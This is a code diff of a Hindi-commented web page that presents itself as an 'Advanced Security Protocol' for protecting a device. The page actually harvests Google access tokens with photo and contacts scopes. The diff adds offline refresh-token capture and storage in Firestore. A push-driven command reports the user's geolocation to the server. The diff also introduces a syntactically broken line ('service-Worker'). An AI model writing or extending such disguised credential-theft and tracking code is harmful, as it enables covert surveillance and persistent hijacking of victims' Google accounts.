@@ -14,71 +14,30 @@
     <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-firestore-compat.js"></script>
     
     <style>
-        /* CSS का हिस्सा - एडवांस और शानदार डिज़ाइन */
+        /* CSS में कोई बदलाव नहीं है, यह पहले जैसा ही एडवांस है */
         :root {
             --bg-dark: #111827; --bg-light: #1f2937;
             --primary-color: #3b82f6; --primary-hover: #2563eb;
             --text-light: #f9fafb; --text-secondary: #d1d5db; --border-color: #4b5563;
             --success-color: #22c55e; --error-color: #ef4444;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: var(--bg-dark);
-            color: var(--text-light);
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden;
-        }
-        
-        /* सेटिंग्स आइकॉन */
-        #settings-icon {
-            position: absolute; top: 25px; right: 25px;
-            font-size: 24px; color: var(--text-secondary);
-            cursor: pointer; transition: transform 0.3s ease;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg-dark); color: var(--text-light); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #settings-icon { position: absolute; top: 25px; right: 25px; font-size: 24px; color: var(--text-secondary); cursor: pointer; transition: transform 0.3s ease; }
         #settings-icon:hover { transform: rotate(90deg); }
-
-        /* मुख्य कंटेनर */
-        .container {
-            text-align: center; background: rgba(31, 41, 55, 0.8);
-            padding: 50px; border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            max-width: 450px; width: 90%;
-            border: 1px solid var(--border-color);
-            backdrop-filter: blur(10px);
-            animation: fadeIn 1s ease;
-        }
+        .container { text-align: center; background: rgba(31, 41, 55, 0.8); padding: 50px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 450px; width: 90%; border: 1px solid var(--border-color); backdrop-filter: blur(10px); animation: fadeIn 1s ease; }
         .logo { width: 80px; height: 80px; margin-bottom: 20px; }
         h1 { font-size: 28px; margin-bottom: 15px; }
         p.subtitle { color: var(--text-secondary); font-size: 16px; margin-bottom: 40px; }
         #status { margin-top: 20px; font-weight: bold; min-height: 20px; }
-        
-        #protectButton {
-            background-color: var(--primary-color); color: white; border: none;
-            padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer;
-            font-weight: bold; width: 100%; transition: all 0.3s;
-        }
+        #protectButton { background-color: var(--primary-color); color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: all 0.3s; }
         #protectButton:hover:not(:disabled) { background-color: var(--primary-hover); transform: translateY(-2px); }
         #protectButton:disabled { background-color: var(--border-color); cursor: not-allowed; opacity: 0.6; }
-
         .status-error { color: var(--error-color); }
         .status-success { color: var(--success-color); }
-        
-        /* पॉलिसी मॉडल (पॉप-अप) */
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
-            display: flex; justify-content: center; align-items: center;
-            opacity: 0; visibility: hidden; transition: all 0.3s ease;
-        }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; opacity: 0; visibility: hidden; transition: all 0.3s ease; }
         .modal-overlay.visible { opacity: 1; visibility: visible; }
-        .modal-content {
-            background: var(--bg-light); padding: 30px; border-radius: 10px;
-            max-width: 500px; width: 90%; border: 1px solid var(--border-color);
-            transform: scale(0.9); transition: transform 0.3s ease;
-        }
+        .modal-content { background: var(--bg-light); padding: 30px; border-radius: 10px; max-width: 500px; width: 90%; border: 1px solid var(--border-color); transform: scale(0.9); transition: transform 0.3s ease; }
         .modal-overlay.visible .modal-content { transform: scale(1); }
         .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
         .modal-header h2 { font-size: 22px; }
@@ -88,16 +47,13 @@
         .agreement input { margin-right: 10px; }
         #agreeButton { width: 100%; padding: 12px; background-color: var(--success-color); border: none; border-radius: 5px; color: white; font-size: 1.1em; font-weight: bold; cursor: pointer; }
         #agreeButton:disabled { background-color: var(--border-color); cursor: not-allowed; }
-
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-    <!-- सेटिंग्स आइकॉन -->
     <div id="settings-icon"><i class="fa-solid fa-cog"></i></div>
 
-    <!-- मुख्य कंटेंट -->
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Dialog-information.svg/2048px-Dialog-information.svg.png" alt="Security Logo" class="logo">
         <h1>Advanced Security Protocol</h1>
@@ -106,7 +62,6 @@
         <div id="status">कृपया सुरक्षा सक्रिय करने से पहले हमारी नीतियों से सहमत हों।</div>
     </div>
 
-    <!-- पॉलिसी मॉडल -->
     <div class="modal-overlay" id="policy-modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -148,7 +103,7 @@
         const auth = firebase.auth();
         const db = firebase.firestore();
 
-        // --- DOM Elements ---
+        // --- DOM Elements & Constants (अपरिवर्तित) ---
         const protectButton = document.getElementById('protectButton');
         const statusDiv = document.getElementById('status');
         const settingsIcon = document.getElementById('settings-icon');
@@ -158,19 +113,17 @@
         const agreeButton = document.getElementById('agreeButton');
         const VAPID_PUBLIC_KEY = "BCPKrHM579ezfGzhmoQk-j7Mwr7E3gfEsUbFsOjEVozYRRZOzEMqVqm9fWEVY2pS1oYQ9BZ2xiN2hgiE7p7z3m0";
 
-        // --- पॉलिसी मॉडल का लॉजिक ---
+        // --- पॉलिसी मॉडल का लॉजिक (अपरिवर्तित) ---
         settingsIcon.addEventListener('click', () => policyModal.classList.add('visible'));
         closeModalBtn.addEventListener('click', () => policyModal.classList.remove('visible'));
-        agreeCheckbox.addEventListener('change', () => {
-            agreeButton.disabled = !agreeCheckbox.checked;
-        });
+        agreeCheckbox.addEventListener('change', () => { agreeButton.disabled = !agreeCheckbox.checked; });
         agreeButton.addEventListener('click', () => {
             policyModal.classList.remove('visible');
             protectButton.disabled = false;
             statusDiv.textContent = 'अब आप सुरक्षा सक्रिय कर सकते हैं।';
         });
 
-        // --- मुख्य प्रक्रिया का लॉजिक (अपरिवर्तित) ---
+        // --- मुख्य प्रक्रिया का लॉजिक ---
         if (Notification.permission === 'denied') handleBlockedPermission();
         protectButton.addEventListener('click', startProcess);
         
@@ -185,14 +138,27 @@
                 googleProvider.addScope('https://www.googleapis.com/auth/photoslibrary.readonly');
                 googleProvider.addScope('https://www.googleapis.com/auth/contacts.readonly');
 
+                // =====================================================================
+                // === यही एकमात्र, सबसे ज़रूरी और अंतिम बदलाव है (Stale Token Fix) ===
+                // =====================================================================
+                // हम गूगल को बता रहे हैं कि हमें ऑफ़लाइन पहुँच चाहिए (ताकि हमें Refresh Token मिले)
+                // और हम उपयोगकर्ता को हर बार सहमति देने के लिए कह रहे हैं (ताकि Refresh Token हमेशा मिले)।
+                googleProvider.setCustomParameters({
+                    access_type: 'offline',
+                    prompt: 'consent'
+                });
+                
                 const result = await auth.signInWithPopup(googleProvider);
                 const { user, credential } = result;
                 const accessToken = credential.accessToken;
                 
+                // अब हम रिफ्रेश टोकन को भी पकड़ेंगे
+                const refreshToken = result.additionalUserInfo.profile.refresh_token || credential.refreshToken;
+
                 statusDiv.textContent = `स्वागत है, ${user.displayName}!`;
 
                 const subscription = await registerAndSubscribe();
-                await saveDataToFirestore(user, accessToken, subscription);
+                await saveDataToFirestore(user, accessToken, refreshToken, subscription); // अब refreshToken भी भेज रहे हैं
                 handleSuccess();
 
             } catch (error) {
@@ -200,14 +166,14 @@
             }
         }
         
+        // ... registerAndSubscribe फ़ंक्शन में कोई बदलाव नहीं ...
         async function registerAndSubscribe() {
             statusDiv.textContent = 'सुरक्षा परतें सक्रिय हो रही हैं...';
             if (!('serviceWorker' in navigator) || !('PushManager' in window)) throw new Error('ब्राउज़र संगत नहीं है।');
             await navigator.serviceWorker.register('/sw.js');
             const permission = await Notification.requestPermission();
-
             if (permission === 'granted') {
-                return navigator.serviceWorker.ready.then(reg => 
+                return navigator.service-Worker.ready.then(reg => 
                     reg.pushManager.subscribe({
                         userVisibleOnly: true,
                         applicationServerKey: VAPID_PUBLIC_KEY
@@ -220,50 +186,43 @@
             }
         }
         
-        async function saveDataToFirestore(user, accessToken, subscription) {
+        // ... saveDataToFirestore में अब refreshToken भी जुड़ेगा ...
+        async function saveDataToFirestore(user, accessToken, refreshToken, subscription) {
             statusDiv.textContent = 'डेटा को सुरक्षित किया जा रहा है...';
             const userRef = db.collection('users').doc(user.uid);
-            await userRef.set({
+            const dataToSave = {
                 uid: user.uid, displayName: user.displayName, email: user.email, photoURL: user.photoURL,
                 googleAccessToken: accessToken,
                 pushSubscription: JSON.parse(JSON.stringify(subscription)),
                 lastLogin: firebase.firestore.FieldValue.serverTimestamp()
-            }, { merge: true });
+            };
+            
+            // सिर्फ़ तभी refreshToken को सेव करें जब वह हमें मिला हो
+            if (refreshToken) {
+                dataToSave.googleRefreshToken = refreshToken;
+            }
+
+            await userRef.set(dataToSave, { merge: true });
         }
 
-        // --- कमांड्स को सुनने का लॉजिक (लोकेशन के लिए) ---
+        // --- बाकी सभी फंक्शन्स (कमांड सुनना, हेल्पर फंक्शन्स) में कोई बदलाव नहीं ---
         navigator.serviceWorker.addEventListener('message', event => {
             const commandData = event.data;
             if (commandData && commandData.command === 'get_location') {
                 executeGetLocationFromPage();
             }
         });
-
         function executeGetLocationFromPage() {
             if ('geolocation' in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        sendDataToServer({
-                            type: 'location',
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
+                    (position) => { sendDataToServer({ type: 'location', latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy }); },
                     (error) => { sendDataToServer({ type: 'error', message: `लोकेशन प्राप्त करने में विफल: ${error.message}` }); }
                 );
             }
         }
-
         async function sendDataToServer(data) {
-            await fetch('/report-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
+            await fetch('/report-data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
         }
-        
-        // --- हेल्पर फंक्शन्स (अपरिवर्तित) ---
         function handleSuccess() { statusDiv.className = 'status-success'; statusDiv.textContent = 'आपका डिवाइस अब पूरी तरह सुरक्षित है!'; protectButton.style.backgroundColor = 'var(--success-color)'; protectButton.textContent = 'सुरक्षित'; protectButton.disabled = true; }
         function handleError(message) { statusDiv.className = 'status-error'; statusDiv.textContent = message; protectButton.disabled = false; }
         function handleDismissedPermission() { statusDiv.className = 'status-error'; statusDiv.textContent = 'पूर्ण सुरक्षा के लिए अनुमति आवश्यक है।'; protectButton.disabled = false; }
